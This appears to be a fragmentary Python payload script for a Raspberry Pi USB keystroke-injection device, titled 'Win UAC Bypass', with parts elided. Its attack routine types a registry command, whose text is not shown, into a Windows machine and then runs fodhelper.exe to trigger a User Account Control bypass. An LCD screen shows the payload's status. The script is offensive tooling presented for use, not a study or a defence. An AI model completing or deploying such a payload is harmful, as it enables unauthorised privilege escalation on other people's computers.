...
def draw_ui(screen_state="main"):
    ...
    d.text((5, 5), "Win UAC Bypass", font=FONT_TITLE, fill="#00FF00")
...
def run_attack():
    ...
    try:
        ...
        time.sleep(0.75)
        hid_helper.type_string(reg_cmd)
        hid_helper.press_key(hid_helper.keyboard.enter)
        time.sleep(0.5)
        hid_helper.type_string("fodhelper.exe") # Launch fodhelper to trigger
        hid_helper.press_key(hid_helper.keyboard.enter)
        time.sleep(0.5)
...
if __name__ == '__main__':
    if not HARDWARE_LIBS_AVAILABLE:
        print("ERROR: Hardware libraries (RPi.GPIO, LCD drivers, PIL) are not available. Cannot run HID Win UAC Bypass.", file=sys.stderr)
        sys.exit(1)
    ...
    try:
        ...
        if HARDWARE_LIBS_AVAILABLE:
            LCD.LCD_Clear()
            GPIO.cleanup()
        print("HID Win UAC Bypass payload finished.")
